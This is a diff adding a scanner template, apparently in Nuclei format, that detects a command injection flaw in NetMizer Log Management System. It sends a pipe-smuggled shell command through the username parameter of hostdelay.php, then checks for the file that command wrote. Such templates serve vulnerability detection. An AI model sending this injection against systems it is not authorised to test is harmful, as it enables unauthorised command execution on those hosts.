@@ -1,0 +1,39 @@
+id: poc-yaml-netmizer-hostdelay-rce
+info:
+  name: NetMizer HostDelay Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,command-injection
+  description: |
+    NetMizer Log Management System is vulnerable to a command injection vulnerability in the hostdelay functionality.
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(10))}}"
+flow: |
+  http(1) && http(2)
+http:
+  - id: check-rce
+    method: GET
+    path:
+      - "/data/hostdelay/hostdelay.php?action=list&username=|echo%20\"helloworld\">{{filename}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+  - id: verify-rce
+    method: GET
+    path:
+      - "/data/hostdelay/{{filename}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "helloworld"
